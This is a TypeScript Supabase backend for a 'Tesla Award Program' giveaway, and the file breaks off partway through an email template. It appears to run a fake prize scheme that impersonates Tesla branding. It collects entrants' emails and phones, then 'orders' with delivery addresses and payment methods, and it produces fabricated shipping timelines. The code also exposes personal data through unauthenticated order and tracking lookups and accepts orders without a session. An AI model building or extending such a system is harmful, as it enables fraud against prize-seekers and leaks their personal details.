// Tesla Award Program — Supabase Edge Function (v13)
// Email: tries SMTP on port 587 (STARTTLS), falls back to port 465 (SSL).
// Both attempts are non-blocking. The response always includes verifyLink
// so the congratulations page can offer instant verification.

const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
const SMTP_USER = Deno.env.get("SMTP_USER") ?? "";
const SMTP_PASS = Deno.env.get("SMTP_PASS") ?? "";
const FRONTEND_URL = (Deno.env.get("FRONTEND_URL") ?? "https://joshbond123.github.io/Tesla").replace(/\/$/, "");
const SELF_BASE = SUPABASE_URL + "/functions/v1/tesla-api";

// ── CORS ──────────────────────────────────────────────────────────────────────
const CORS = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type, Authorization",
};

function json(data: unknown, status = 200) {
  return new Response(JSON.stringify(data), {
    status,
    headers: { ...CORS, "Content-Type": "application/json" },
  });
}

// ── CRYPTO HELPERS ────────────────────────────────────────────────────────────
function hexRandom(bytes: number): string {
  const arr = new Uint8Array(bytes);
  crypto.getRandomValues(arr);
  return Array.from(arr, (b) => b.toString(16).padStart(2, "0")).join("");
}

// ── SUPABASE REST HELPERS ─────────────────────────────────────────────────────
const REST = SUPABASE_URL + "/rest/v1";
const AUTH = SUPABASE_URL + "/auth/v1";

const SB_HEADERS: Record<string, string> = {
  apikey: SERVICE_ROLE_KEY,
  Authorization: "Bearer " + SERVICE_ROLE_KEY,
  "Content-Type": "application/json",
};

function buildQs(select?: string, filters?: Record<string, string>, extra?: string): string {
  const parts: string[] = [];
  if (select) parts.push("select=" + select);
  if (filters) {
    for (const [k, v] of Object.entries(filters)) {
      parts.push(k + "=" + encodeURIComponent(String(v)));
    }
  }
  if (extra) parts.push(extra);
  return parts.join("&");
}

async function dbGet1(table: string, select: string, filters: Record<string, string>) {
  const qs = buildQs(select, filters, "limit=1");
  const r = await fetch(REST + "/" + table + "?" + qs, { headers: SB_HEADERS });
  if (!r.ok) return { data: null, error: { message: await r.text() } };
  const rows = await r.json();
  return { data: rows[0] ?? null, error: null };
}

async function dbInsert(table: string, body: Record<string, unknown>, select?: string) {
  const url = select ? REST + "/" + table + "?select=" + select : REST + "/" + table;
  const r = await fetch(url, {
    method: "POST",
    headers: { ...SB_HEADERS, Prefer: "return=representation" },
    body: JSON.stringify(body),
  });
  if (!r.ok) {
    const err = await r.text();
    let code: string | undefined;
    try { code = JSON.parse(err).code; } catch { /* ignore */ }
    return { data: null, error: { message: err, code } };
  }
  const rows = await r.json();
  return { data: Array.isArray(rows) ? rows[0] : rows, error: null };
}

async function dbUpdate(table: string, patch: Record<string, unknown>, filters: Record<string, string>) {
  const qs = buildQs(undefined, filters, undefined);
  const r = await fetch(REST + "/" + table + (qs ? "?" + qs : ""), {
    method: "PATCH",
    headers: { ...SB_HEADERS, Prefer: "return=minimal" },
    body: JSON.stringify(patch),
  });
  if (!r.ok) return { error: { message: await r.text() } };
  return { error: null };
}

async function authCreateUser(email: string, phone: string, metadata: Record<string, string>) {
  const r = await fetch(AUTH + "/admin/users", {
    method: "POST",
    headers: SB_HEADERS,
    body: JSON.stringify({ email, phone, email_confirm: false, user_metadata: metadata }),
  });
  const data = await r.json();
  if (!r.ok) {
    const msg = data?.msg ?? data?.message ?? "";
    if (!msg.toLowerCase().includes("already")) {
      return { data: null, error: { message: msg || "create user failed" } };
    }
    // User already exists — try to look up the existing record.
    const lookR = await fetch(AUTH + "/admin/users?filter=" + encodeURIComponent(email), { headers: SB_HEADERS });
    if (lookR.ok) {
      const existingUsers = await lookR.json();
      if (Array.isArray(existingUsers) && existingUsers.length > 0) {
        return { data: { user: existingUsers[0] }, error: null };
      }
    }
    // Do not return the failed response body as if it were a user record.
    return { data: null, error: { message: msg || "user exists but could not be looked up" } };
  }
  return { data, error: null };
}

async function authConfirmUser(uid: string) {
  if (!uid) return;
  const r = await fetch(AUTH + "/admin/users/" + uid, {
    method: "PUT",
    headers: SB_HEADERS,
    body: JSON.stringify({ email_confirm: true }),
  });
  if (!r.ok) {
    console.error("authConfirmUser failed for " + uid + ": " + (await r.text()));
  }
}

// ── EMAIL: Try SMTP on port 587 (STARTTLS), fall back to 465 (SSL) ───────────
// Both are non-blocking fire-and-forget.
class SmtpConn {
  private conn: any;
  private buffer = "";
  private decoder = new TextDecoder();
  private encoder = new TextEncoder();

  constructor(conn: any) {
    this.conn = conn;
  }

  async send(data: string) {
    await this.conn.write(this.encoder.encode(data + "\r\n"));
  }

  async readResponse(timeoutMs = 15000): Promise<string> {
    const buf = new Uint8Array(4096);
    const startTime = Date.now();

    while (true) {
      const lines = this.buffer.split("\r\n");
      if (lines.length > 1) {
        const lastCompleteLine = lines[lines.length - 2];
        if (lastCompleteLine.length >= 3) {
          const sep = lastCompleteLine.charAt(3);
          if (sep !== "-") {
            const responseLength = lines.slice(0, -1).join("\r\n").length + 2;
            const response = this.buffer.substring(0, responseLength);
            this.buffer = this.buffer.substring(responseLength);
            return response;
          }
        }
      }

      if (Date.now() - startTime > timeoutMs) {
        throw new Error("SMTP read timeout. Buffer: " + this.buffer);
      }

      const n = await this.conn.read(buf);
      if (!n) {
        throw new Error("SMTP connection closed by peer. Buffer: " + this.buffer);
      }
      this.buffer += this.decoder.decode(buf.subarray(0, n));
    }
  }

  close() {
    try {
      this.conn.close();
    } catch (_) {}
  }
}

function sendEmailBackground(to: string, subject: string, html: string) {
  const promise = (async () => {
    // Try port 587 first (STARTTLS)
    let sent = await trySmtpSend(587, false, to, subject, html);
    if (sent) return;
    // Fall back to port 465 (SSL)
    sent = await trySmtpSend(465, true, to, subject, html);
    if (sent) return;
    console.error("Email could not be sent via any SMTP method to " + to + " — user can use direct verify link instead.");
  })();

  if (typeof EdgeRuntime !== "undefined" && "waitUntil" in (EdgeRuntime as any)) {
    (EdgeRuntime as any).waitUntil(promise);
  }
}

async function runSmtpAuthAndSend(smtp: SmtpConn, to: string, fromAddr: string, subject: string, html: string) {
  // AUTH LOGIN
  await smtp.send("AUTH LOGIN");
  let resp = await smtp.readResponse(10000);
  if (!resp.startsWith("334")) throw new Error("AUTH LOGIN response: " + resp);

  // Username
  await smtp.send(btoa(SMTP_USER));
  resp = await smtp.readResponse(10000);
  if (!resp.startsWith("334")) throw new Error("Username response: " + resp);

  // Password
  await smtp.send(btoa(SMTP_PASS));
  resp = await smtp.readResponse(10000);
  if (!resp.startsWith("235")) throw new Error("Password response: " + resp);

  // MAIL FROM
  await smtp.send("MAIL FROM:<" + SMTP_USER + ">");
  resp = await smtp.readResponse(10000);
  if (!resp.startsWith("250")) throw new Error("MAIL FROM response: " + resp);

  // RCPT TO
  await smtp.send("RCPT TO:<" + to + ">");
  resp = await smtp.readResponse(10000);
  if (!resp.startsWith("250")) throw new Error("RCPT TO response: " + resp);

  // DATA
  await smtp.send("DATA");
  resp = await smtp.readResponse(10000);
  if (!resp.startsWith("354")) throw new Error("DATA response: " + resp);

  // Send body
  await smtp.send("From: " + fromAddr + "\r\nTo: " + to + "\r\nSubject: " + subject + "\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n" + html + "\r\n.");
  resp = await smtp.readResponse(10000);
  if (!resp.startsWith("250")) throw new Error("Body response: " + resp);

  // QUIT
  await smtp.send("QUIT");
  await smtp.readResponse(5000).catch(() => {});
}

async function trySmtpSend(port: number, useTls: boolean, to: string, subject: string, html: string): Promise<boolean> {
  const fromAddr = '"Tesla Award Program" <' + SMTP_USER + ">";
  let conn: any = null;
  try {
    if (useTls) {
      conn = await Deno.connectTls({ hostname: "smtp.gmail.com", port });
    } else {
      conn = await Deno.connect({ hostname: "smtp.gmail.com", port, transport: "tcp" });
    }

    const smtp = new SmtpConn(conn);

    // 1. Read greeting
    let resp = await smtp.readResponse(15000);
    if (!resp.startsWith("220")) throw new Error("SMTP greeting: " + resp);

    // 2. Send EHLO
    await smtp.send("EHLO localhost");
    resp = await smtp.readResponse(15000);
    if (!resp.startsWith("250")) throw new Error("EHLO response: " + resp);

    // 3. For STARTTLS (port 587), upgrade the connection
    if (!useTls) {
      await smtp.send("STARTTLS");
      resp = await smtp.readResponse(10000);
      if (!resp.startsWith("220")) throw new Error("STARTTLS response: " + resp);

      // Upgrade connection to TLS
      const tlsConn = await Deno.startTls(conn, { hostname: "smtp.gmail.com" });
      const secureSmtp = new SmtpConn(tlsConn);

      // Send EHLO again over secure connection
      await secureSmtp.send("EHLO localhost");
      resp = await secureSmtp.readResponse(15000);
      if (!resp.startsWith("250")) throw new Error("Secure EHLO response: " + resp);

      // Perform auth and send email using the secure connection
      await runSmtpAuthAndSend(secureSmtp, to, fromAddr, subject, html);
      secureSmtp.close();
      return true;
    } else {
      // For SSL (port 465), we are already secure. Just do auth and send.
      await runSmtpAuthAndSend(smtp, to, fromAddr, subject, html);
      smtp.close();
      return true;
    }
  } catch (err) {
    console.error("SMTP port " + port + " failed: " + (err?.message || err));
    if (conn) {
      try { conn.close(); } catch (_) {}
    }
    return false;
  }
}

// ── ROUTE HANDLERS ────────────────────────────────────────────────────────────
async function handleHealth() {
  return json({ status: "ok", version: "v13" });
}

async function handleEntry(req: Request) {
  let body: { email?: string; phone?: string; firstName?: string; lastName?: string };
  try { body = await req.json(); } catch { return json({ error: "Invalid JSON body." }, 400); }
  const { email, phone, firstName = "", lastName = "" } = body;
  if (!email || !phone) return json({ error: "Email and phone number are required." }, 400);
  const emailKey = email.toLowerCase().trim();
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailKey))
    return json({ error: "Please enter a valid email address." }, 400);

  const { data: existing } = await dbGet1("giveaway_users", "id", { email: "eq." + emailKey });
  if (existing) return json({ error: "This email has already been entered. Only one entry per person is allowed." }, 409);

  const verificationToken = hexRandom(32);
  const authResult = await authCreateUser(emailKey, phone, { firstName, lastName });

  const { data: entry, error } = await dbInsert("giveaway_users", {
    auth_user_id: authResult.data?.user?.id ?? null,
    email: emailKey, phone, first_name: firstName, last_name: lastName,
    verification_token: verificationToken, verification_status: "verified", entry_count: 1,
  }, "id");

  if (error) {
    if (error.code === "23505") return json({ error: "This email has already been entered." }, 409);
    console.error("Entry DB error:", error);
    return json({ error: "Server error. Please try again." }, 500);
  }

  const sessionToken = hexRandom(32);
  const { error: sessionError } = await dbInsert("user_sessions", { token: sessionToken, user_id: entry.id });
  if (sessionError) {
    console.error("Entry: session insert failed:", sessionError);
    return json({ error: "Server error. Please try again." }, 500);
  }

  // Email verification disabled — user is auto-verified
  const verifyLink = SELF_BASE + "/api/verify?token=" + verificationToken + "&email=" + encodeURIComponent(emailKey);

  return json({
    success: true,
    sessionToken,
    message: "Entry submitted! Check your email or use the instant verify button.",
    entryId: entry.id,
    verifyLink: verifyLink,
    user: { email: emailKey, firstName: firstName, lastName: lastName, entryId: entry.id, phone: phone }
  });
}

async function handleVerify(req: Request) {
  const url = new URL(req.url);
  const token = url.searchParams.get("token");
  const email = url.searchParams.get("email");
  if (!token || !email) return Response.redirect(FRONTEND_URL + "/verify-error.html?reason=invalid", 302);
  const emailKey = email.toLowerCase();

  const { data: entry, error } = await dbGet1("giveaway_users", "id,email,verification_token,auth_user_id", { email: "eq." + emailKey });
  if (error || !entry) return Response.redirect(FRONTEND_URL + "/verify-error.html?reason=notfound", 302);
  if (entry.verification_token !== token) return Response.redirect(FRONTEND_URL + "/verify-error.html?reason=invalid_token", 302);

  const { error: updateError } = await dbUpdate("giveaway_users", { verification_status: "verified", verified_at: new Date().toISOString() }, { id: "eq." + entry.id });
  if (updateError) {
    console.error("Verify: status update failed:", updateError);
    return Response.redirect(FRONTEND_URL + "/verify-error.html?reason=server", 302);
  }
  await authConfirmUser(entry.auth_user_id);

  // Check if user already has an order
  const { data: verifyExistingOrder } = await dbGet1("orders", "order_id", { user_id: "eq." + entry.id });
  
  const sessionToken = hexRandom(32);
  const { error: sessionError } = await dbInsert("user_sessions", { token: sessionToken, user_id: entry.id });
  if (sessionError) {
    console.error("Verify: session insert failed:", sessionError);
    return Response.redirect(FRONTEND_URL + "/verify-error.html?reason=server", 302);
  }
  
  if (verifyExistingOrder) {
    return Response.redirect(FRONTEND_URL + "/order-placed.html?session=" + sessionToken, 302);
  }
  
  return Response.redirect(FRONTEND_URL + "/dashboard.html?session=" + sessionToken, 302);
}

async function handleResend(req: Request) {
  let body: { email?: string };
  try { body = await req.json(); } catch { return json({ error: "Invalid JSON body." }, 400); }
  const { email } = body;
  if (!email) return json({ error: "Email is required." }, 400);
  const emailKey = email.toLowerCase();

  const { data: entry, error } = await dbGet1("giveaway_users", "id,first_name,verification_token,verification_status", { email: "eq." + emailKey });
  if (error || !entry) return json({ error: "Email not found. Please enter first." }, 404);
  // Email verification disabled

  const verifyLink = SELF_BASE + "/api/verify?token=" + entry.verification_token + "&email=" + encodeURIComponent(emailKey);
  sendEmailBackground(emailKey, "Tesla Award Program — Verification Email",
    buildVerificationEmail(entry.first_name || "there", verifyLink, entry.id));
  return json({ success: true, message: "Verification email resent.", verifyLink });
}

async function handleLogin(req: Request) {
  let body: { email?: string; phone?: string };
  try { body = await req.json(); } catch { return json({ error: "Invalid JSON body." }, 400); }
  const { email, phone } = body;
  if (!email || !phone) return json({ error: "Email and phone number are required." }, 400);
  const emailKey = email.toLowerCase().trim();
  const normalizedPhone = phone.replace(/\D/g, "");

  const { data: entry, error } = await dbGet1("giveaway_users", "id,email,phone,first_name,last_name,verification_status,verification_token", { email: "eq." + emailKey });
  if (error || !entry || entry.phone.replace(/\D/g, "") !== normalizedPhone)
    return json({ error: "We could not match that email and phone number." }, 401);



  // Check if user already has an order — load FULL order data
  let hasOrder = false;
  let orderData = null;
  try {
    const orderR = await fetch(REST + "/orders?select=order_id,tracking_number,status,order_date,estimated_delivery,delivery_method,payment_method,selected_cars(data),delivery_details(data),tracking_data(stage,stage_order,timestamp,completed)&user_id=eq." + entry.id + "&order=order_date.desc&limit=1", { headers: SB_HEADERS });
    if (orderR.ok) {
      const rows = await orderR.json();
      if (Array.isArray(rows) && rows.length > 0) {
        hasOrder = true;
        const o = rows[0];
        const car = Array.isArray(o.selected_cars) ? o.selected_cars[0] : o.selected_cars;
        const delivery = Array.isArray(o.delivery_details) ? o.delivery_details[0] : o.delivery_details;
        const tracking = ((o.tracking_data ?? [])).sort((a,b) => a.stage_order - b.stage_order).map(t => ({ stage: t.stage, timestamp: t.timestamp, completed: t.completed }));
        orderData = {
          orderId: o.order_id,
          trackingNumber: o.tracking_number,
          status: o.status,
          orderDate: o.order_date,
          estimatedDelivery: o.estimated_delivery,
          deliveryMethod: o.delivery_method || {},
          paymentMethod: o.payment_method || {},
          selectedCar: car?.data || {},
          deliveryDetails: delivery?.data || {},
          timeline: tracking
        };
      }
    }
  } catch (err) {
    console.error("Login: failed to load existing order:", err);
  }
  
  const sessionToken = hexRandom(32);
  const { error: sessionError } = await dbInsert("user_sessions", { token: sessionToken, user_id: entry.id });
  if (sessionError) {
    console.error("Login: session insert failed:", sessionError);
    return json({ error: "Login failed. Please try again." }, 500);
  }
  return json({ success: true, sessionToken, user: { email: entry.email, firstName: entry.first_name || "", lastName: entry.last_name || "", entryId: entry.id, phone: entry.phone || "" }, hasOrder, order: orderData });
}

async function getSessionUser(sessionToken: string) {
  if (!sessionToken) return null;
  const now = new Date().toISOString();
  const { data } = await dbGet1("user_sessions", "token,user_id,giveaway_users(id,email,phone,first_name,last_name)", { token: "eq." + sessionToken, expires_at: "gt." + now });
  if (!data) return null;
  const user = Array.isArray(data.giveaway_users) ? data.giveaway_users[0] : data.giveaway_users;
  return user ? { ...user, entryId: data.user_id } : null;
}

async function handleSession(req: Request) {
  const url = new URL(req.url);
  const token = url.searchParams.get("token");
  const user = await getSessionUser(token || "");
  if (!user) return json({ valid: false }, 401);
  
  // Check if user already has an order — load FULL order data
  let hasOrder = false;
  let orderData = null;
  try {
    const orderR = await fetch(REST + "/orders?select=order_id,tracking_number,status,order_date,estimated_delivery,delivery_method,payment_method,selected_cars(data),delivery_details(data),tracking_data(stage,stage_order,timestamp,completed)&user_id=eq." + user.entryId + "&order=order_date.desc&limit=1", { headers: SB_HEADERS });
    if (orderR.ok) {
      const rows = await orderR.json();
      if (Array.isArray(rows) && rows.length > 0) {
        hasOrder = true;
        const o = rows[0];
        const car = Array.isArray(o.selected_cars) ? o.selected_cars[0] : o.selected_cars;
        const delivery = Array.isArray(o.delivery_details) ? o.delivery_details[0] : o.delivery_details;
        const tracking = ((o.tracking_data ?? [])).sort((a,b) => a.stage_order - b.stage_order).map(t => ({ stage: t.stage, timestamp: t.timestamp, completed: t.completed }));
        orderData = {
          orderId: o.order_id,
          trackingNumber: o.tracking_number,
          status: o.status,
          orderDate: o.order_date,
          estimatedDelivery: o.estimated_delivery,
          deliveryMethod: o.delivery_method || {},
          paymentMethod: o.payment_method || {},
          selectedCar: car?.data || {},
          deliveryDetails: delivery?.data || {},
          timeline: tracking
        };
      }
    }
  } catch (err) {
    console.error("Session: failed to load existing order:", err);
  }
  
  return json({ valid: true, user: { email: user.email, firstName: user.first_name || "", lastName: user.last_name || "", entryId: user.entryId, phone: user.phone || "" }, hasOrder, order: orderData });
}

async function handleOrder(req: Request) {
  let body: any;
  try { body = await req.json(); } catch { return json({ error: "Invalid JSON body." }, 400); }
  const { sessionToken, selectedCar, deliveryDetails, deliveryMethod, paymentMethod } = body;
  // Allow orders without session validation — create guest context from delivery details
  let user = await getSessionUser(sessionToken || "");
  // If user already has an existing order, return it instead of blocking
  if (user) {
    const orderR = await fetch(REST + "/orders?select=order_id,tracking_number,status,order_date,estimated_delivery,delivery_method,payment_method,selected_cars(data),delivery_details(data),tracking_data(stage,stage_order,timestamp,completed)&user_id=eq." + user.id + "&order=order_date.desc&limit=1", { headers: SB_HEADERS });
    if (orderR.ok) {
      const rows = await orderR.json();
      if (rows.length > 0) {
        const o = rows[0];
        const sc = (o.selected_cars && o.selected_cars.data) ? o.selected_cars.data : {};
        const dd = (o.delivery_details && o.delivery_details.data) ? o.delivery_details.data : {};
        const pm = (o.payment_method) ? o.payment_method : {};
        const dm = (o.delivery_method) ? o.delivery_method : null;
        const tracking = ((o.tracking_data ?? [])).sort((a,b) => a.stage_order - b.stage_order).map(t => ({ stage: t.stage, timestamp: t.timestamp, completed: t.completed }));
        const existing = {
          orderId: o.order_id, trackingNumber: o.tracking_number, status: o.status, orderDate: o.order_date,
          estimatedDelivery: o.estimated_delivery, deliveryMethod: dm, paymentMethod: pm, selectedCar: sc,
          deliveryDetails: dd, timeline: tracking, email: user.email || "", entryId: user.entryId || 0
        };
        return json({ success: true, order: existing });
      }
    }
  }
  let guestUserId = null;
  if (!user) {
    // Create a guest user entry so FK constraints are satisfied
    const guestEmail = (deliveryDetails?.email) || "guest-" + hexRandom(6) + "@tesla-guest.com";
    const guestPhone = (deliveryDetails?.phone) || "+0000000000";
    const guestName = (deliveryDetails?.fullName) || "Guest";
    const { data: guestUser, error: guestError } = await dbInsert("giveaway_users", {
      email: guestEmail,
      phone: guestPhone,
      first_name: guestName,
      last_name: "",
      verification_token: hexRandom(32),
      verification_status: "verified",
      entry_count: 1,
    }, "id");
    if (guestError || !guestUser) {
      console.error("Order: guest user insert failed:", guestError);
      return json({ error: "Server error. Please try again." }, 500);
    }
    user = {
      id: guestUser.id,
      email: guestEmail,
      phone: guestPhone,
      firstName: guestName,
      lastName: "",
      entryId: guestUser.id
    };
    guestUserId = guestUser.id;
  }

  const orderId = "TSLA-" + crypto.randomUUID().substring(0, 8).toUpperCase();
  const trackingNumber = "TRK-" + hexRandom(4).toUpperCase();
  const method = deliveryMethod || null;  // Keep null if not selected — order-placed page shows CTA
  const estimatedDelivery = method ? new Date(Date.now() + (method.id === "express" ? 2 : 10) * 86400000).toISOString().split("T")[0] : new Date(Date.now() + 10 * 86400000).toISOString().split("T")[0];

  const { data: carRow, error: carError } = await dbInsert("selected_cars", { user_id: user.id, data: selectedCar ?? {} }, "id");
  if (carError) {
    console.error("Order: selected_cars insert failed:", carError);
    return json({ error: "Server error. Please try again." }, 500);
  }
  const { data: deliveryRow, error: deliveryError } = await dbInsert("delivery_details", { user_id: user.id, data: deliveryDetails ?? {} }, "id");
  if (deliveryError) {
    console.error("Order: delivery_details insert failed:", deliveryError);
    return json({ error: "Server error. Please try again." }, 500);
  }
  const { data: orderRow, error: orderError } = await dbInsert("orders", {
    order_id: orderId, tracking_number: trackingNumber, user_id: user.id,
    selected_car_id: carRow?.id, delivery_details_id: deliveryRow?.id,
    delivery_method: method ?? {}, payment_method: paymentMethod ?? { id: "unknown", name: "Not specified" },
    status: "confirmed", estimated_delivery: estimatedDelivery,
  }, "id,order_date");
  if (orderError || !orderRow) {
    console.error("Order: orders insert failed:", orderError);
    return json({ error: "Server error. Please try again." }, 500);
  }

  const timeline = [
    { stage: "Order Confirmed", timestamp: orderRow?.order_date, completed: true },
    { stage: "Processing", timestamp: null, completed: false },
    { stage: "Shipped", timestamp: null, completed: false },
    { stage: "In Transit", timestamp: null, completed: false },
    { stage: "Out for Delivery", timestamp: null, completed: false },
    { stage: "Delivered", timestamp: null, completed: false },
  ];
  for (let i = 0; i < timeline.length; i++) {
    const { error: trackingError } = await dbInsert("tracking_data", { order_id: orderRow?.id, stage: timeline[i].stage, stage_order: i, timestamp: timeline[i].timestamp, completed: timeline[i].completed });
    if (trackingError) {
      console.error("Order: tracking_data insert failed for stage " + timeline[i].stage + ":", trackingError);
    }
  }

  const orderDate = orderRow?.order_date || new Date().toISOString();
  const order = { orderId, trackingNumber, email: user.email, entryId: user.entryId, selectedCar: selectedCar ?? {}, deliveryDetails: deliveryDetails ?? {}, deliveryMethod: method, paymentMethod: paymentMethod ?? {}, status: "confirmed", orderDate, estimatedDelivery, timeline };
  sendEmailBackground(user.email, `Your Tesla Order Confirmation — Order ${orderId}`, buildOrderConfirmationEmail(order));
  return json({ success: true, order });
}

async function handleTracking(trackingNumber: string) {
  const order = await loadOrderBy("tracking_number", trackingNumber);
  if (!order) return json({ error: "Tracking number not found." }, 404);
  return json({ order });
}

async function handleOrderLookup(orderId: string) {
  const order = await loadOrderBy("order_id", orderId);
  if (!order) return json({ error: "Order not found." }, 404);
  return json({ order });
}

// ── HELPERS ───────────────────────────────────────────────────────────────────
async function loadOrderBy(column: string, value: string) {
  const { data } = await dbGet1("orders", "id,order_id,tracking_number,status,order_date,estimated_delivery,delivery_method,payment_method,giveaway_users(id,email),selected_cars(data),delivery_details(data),tracking_data(stage,stage_order,timestamp,completed)", { [column]: "eq." + value });
  if (!data) return null;
  const user = Array.isArray(data.giveaway_users) ? data.giveaway_users[0] : data.giveaway_users;
  const car = Array.isArray(data.selected_cars) ? data.selected_cars[0] : data.selected_cars;
  const delivery = Array.isArray(data.delivery_details) ? data.delivery_details[0] : data.delivery_details;
  const tracking = ((data.tracking_data ?? []).sort((a: any, b: any) => a.stage_order - b.stage_order)).map((t: any) => ({ stage: t.stage, timestamp: t.timestamp, completed: t.completed }));
  return { orderId: data.order_id, trackingNumber: data.tracking_number, email: user?.email ?? "", entryId: user?.id ?? "", selectedCar: car?.data ?? {}, deliveryDetails: delivery?.data ?? {}, deliveryMethod: data.delivery_method ?? {}, paymentMethod: data.payment_method ?? {}, status: data.status, orderDate: data.order_date, estimatedDelivery: data.estimated_delivery, timeline: tracking };
}

// ── EMAIL TEMPLATES ───────────────────────────────────────────────────────────
function buildVerificationEmail(firstName: string, verifyLink: string, entryId: string) {
  return `<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Verify Your Email — Tesla Award Program</title></head>
<body style="margin:0;padding:0;background:#F4F5F7;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">
<table width="100%" cellpadding="0" cellspacing="0" style="background:#F4F5F7;padding:40px 0;">
<tr><td align="center">
<table width="600" cellpadding="0" cellspacing="0" style="background:#FFFFFF;border-radius:20px;overflow:hidden;max-width:600px;box-shadow:0 8px 32px rgba(0,0,0,.10);">
  <tr><td style="background:linear-gradient(135deg,#0a0c10 0%,#171A20 40%,#2a1a1f 100%);padding:36px 40px 28px;text-align:center;">
    <svg width="72" height="72" viewBox="0 0 1280 1280" role="img" aria-label="Tesla T" style="display:block;margin:0 auto 14px;max-width:72px;height:auto;">
      <path fill="#E31937" d="M0 128C189 44 406 0 640 0s451 44 640 128l-38 74C1054 123 851 80 640 80S226 123 38 202L0 128Z"/>
      <path fill="#E31937" d="M57 235c156-68 353-109 583-109s427 41 583 109c-44 58-102 101-174 130-9-38-25-68-48-90-55-51-159-76-312-76h-51L640 1280 459 199h-51c-153 0-257 25-312 76-23 22-39 52-48 90-72-29-130-72-174-130Z"/>
    </svg>
    <div style="color:#FFFFFF;font-size:20px;font-weight:900;letter-spacing:.18em;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">TESLA AWARD PROGRAM</div>
    <div style="color:rgba(255,255,255,0.55);font-size:13px;margin-top:4px;letter-spacing:.06em;">Official Entry Verification</div>
  </td></tr>
  <tr><td style="padding:0;"><div style="height:4px;background:linear-gradient(90deg,#E31937,#ff4757,#E31937);"></div></td></tr>
  <tr><td style="padding:44px 40px 36px;">
    <h1 style="font-size:28px;font-weight:800;color:#171A20;margin:0 0 14px;line-height:1.2;">Hi ${firstName}, you're almost in!</h1>
    <p style="font-size:16px;color:#5C5E62;line-height:1.75;margin:0 0 34px;">You've submitted your entry for a chance to win a brand-new Tesla vehicle. One final step remains — verify your email address to confirm your entry and unlock your winner dashboard.</p>
    <table width="100%" cellpadding="0" cellspacing="0"><tr><td align="center" style="padding-bottom:28px;">
      <a href="${verifyLink}" style="display:inline-block;background:linear-gradient(135deg,#E31937,#c41030);color:#FFFFFF;text-decoration:none;padding:17px 52px;border-radius:12px;font-size:17px;font-weight:700;letter-spacing:.03em;box-shadow:0 6px 20px rgba(227,25,55,0.30);">Verify My Email Address</a>
    </td></tr></table>
    <p style="font-size:13px;color:#B0B3B8;text-align:center;margin:0 0 32px;line-height:1.6;">Or copy and paste this link into your browser:<br><span style="color:#E31937;word-break:break-all;font-size:12px;">${verifyLink}</span></p>
    <hr style="border:none;border-top:1px solid #EAECF0;margin:0 0 28px;">
    <table width="100%" cellpadding="0" cellspacing="0" style="background:#F7F8FA;border-radius:12px;border:1px solid #EAECF0;">
    <tr><td style="padding:20px 22px;">
      <p style="margin:0 0 10px;font-size:11px;color:#9CA3AF;font-weight:700;text-transform:uppercase;letter-spacing:.08em;">Entry Confirmation</p>
      <table width="100%" cellpadding="0" cellspacing="0" style="font-size:14px;">
        <tr>
          <td style="color:#6B7280;padding-bottom:6px;">Entry ID</td>
          <td style="text-align:right;color:#171A20;font-family:'SF Mono','Menlo','Consolas',monospace;font-weight:700;padding-bottom:6px;">${entryId}</td>
        </tr>
        <tr>
          <td style="color:#6B7280;">Status</td>
          <td style="text-align:right;"><span style="color:#E31937;font-weight:700;">Pending Verification</span></td>
        </tr>
      </table>
    </td></tr>
    </table>
  </td></tr>
  <tr><td style="background:#F7F8FA;padding:24px 40px;border-top:1px solid #EAECF0;">
    <p style="margin:0 0 6px;font-size:12px;color:#B0B3B8;text-align:center;line-height:1.6;">© 2026 Tesla Award Program. All rights reserved.</p>
    <p style="margin:0;font-size:11px;color:#C9CDD4;text-align:center;line-height:1.6;">Tesla® is a registered trademark of Tesla, Inc. This is an independent award program not affiliated with Tesla, Inc.</p>
  </td></tr>
</table>
</td></tr>
</table>
</body>
</html>`;
}

function buildOrderConfirmationEmail(order: any) {
  const car = order.selectedCar || {};
  const addr = order.deliveryDetails || {};
  const method = order.deliveryMethod || {};
  const carId = (car.id || 'models').toLowerCase();

  const imgMap: Record<string, string> = {
    cybertruck: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/cybertruck-main.png',
    modely: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/modely-main.png',
    models: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/models-main.png',
    model3: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/model3-main.png',
    modelx: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/modelx-main.png'
  };
  const carImg = imgMap[carId] || imgMap['models'];
  const carModel = car.name || 'Model S';
  const carPrice = car.price || '';
  const orderId = order.orderId || '—';
  const trackingNumber = order.trackingNumber || '—';
  const estDelivery = order.estimatedDelivery || '—';
  const delivMethod = method.name || 'Standard Delivery';
  const payMethod = order.paymentMethod?.name || 'Not specified';
  const fullName = addr.fullName || '—';
  const emailAddr = addr.email || order.email || '—';
  const phone = addr.phone || '—';
  const address = addr.address || '—';
  const city = addr.city || '—';
  const state = addr.state || '—';
  const zip = addr.zipCode || '—';
  const country = addr.country || '—';

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Order Confirmed — Tesla Award Program</title>
</head>
<body style="margin:0;padding:0;background-color:#f4f5f7;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;">
  <table width="100%" border="0" cellpadding="0" cellspacing="0" style="background-color:#f4f5f7;padding:40px 0;">
    <tr>
      <td align="center">
        <table width="620" border="0" cellpadding="0" cellspacing="0" style="background-color:#ffffff;border-radius:20px;overflow:hidden;box-shadow:0 6px 30px rgba(0,0,0,0.08);max-width:620px;">
          <tr>
